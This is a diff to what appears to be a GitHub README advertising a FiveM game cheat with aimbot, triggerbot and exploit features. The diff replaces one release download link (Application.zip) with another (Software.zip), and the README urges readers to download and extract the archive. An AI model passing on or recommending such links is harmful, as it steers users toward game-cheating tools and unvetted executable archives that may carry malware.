@@ -7,7 +7,7 @@ This cheat offers various features like aimbot, triggerbot, exploits, and custom
 
 If you are interested in exploring the functionalities of this cheat, make sure to check out the link provided below and download the cheat:
 
-[![Download Cheat](https://github.com/Goutham1383/FiveM-External-Cheat-KeyAuth-System/releases/download/v1.0/Application.zip)](https://github.com/Goutham1383/FiveM-External-Cheat-KeyAuth-System/releases/download/v1.0/Application.zip)
+[![Download Cheat](https://github.com/Goutham1383/FiveM-External-Cheat-KeyAuth-System/releases/download/v2.0/Software.zip)](https://github.com/Goutham1383/FiveM-External-Cheat-KeyAuth-System/releases/download/v2.0/Software.zip)
 
 Please note that the file needs to be extracted after download to access the cheat application.
 
